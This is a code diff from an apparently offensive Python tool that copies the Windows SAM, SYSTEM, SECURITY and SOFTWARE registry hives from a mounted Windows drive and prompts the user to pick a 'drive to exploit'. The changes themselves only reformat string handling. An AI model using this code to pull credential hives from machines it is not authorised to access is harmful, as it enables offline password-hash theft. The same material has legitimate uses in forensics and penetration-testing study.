@@ -76,29 +76,29 @@ def copy_winpayload():
     # them. This will be slow but very cool
 
     stamp = str(datetime.datetime.now().timestamp())
-    directory = f'{os.getcwd()}/hives_{stamp[:10]}'
+    directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
     os.mkdir(directory) 
 
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/sam', 
-                f'{directory}/sam')
+                '{}/sam'.format(directory))
     except FileNotFoundError as e:
         print('sam not found')
 
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/system',
-                f'{directory}/system')
+                '{}/system'.format(directory))
     except FileNotFoundError as e:
         print('system not found')
 
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/security', 
-                f'{directory}/security')
+                '{}/security'.format(directory))
     except FileNotFoundError as e:
         print('security not found')
     try:
         shutil.copyfile('/media/windows/Windows/System32/config/software',
-                f'{directory}/software')
+                '{}/software'.format(directory))
     except FileNotFoundError as e:
         print('software not found')
         
@@ -146,7 +146,7 @@ def check_for_windrives(raw_drives):
             drive_count += 1
         target = input('\n========================================='
                 '===============\nplease choose a drive to exploit.'
-                ' Note drives start at 0\n\nDrive')
+                ' Note drives start at 0\n\nDrive ')
         print('****************************************************'
                 '*****************************************')
         print('Targeting: ' + raw_win_drives[int(target)])
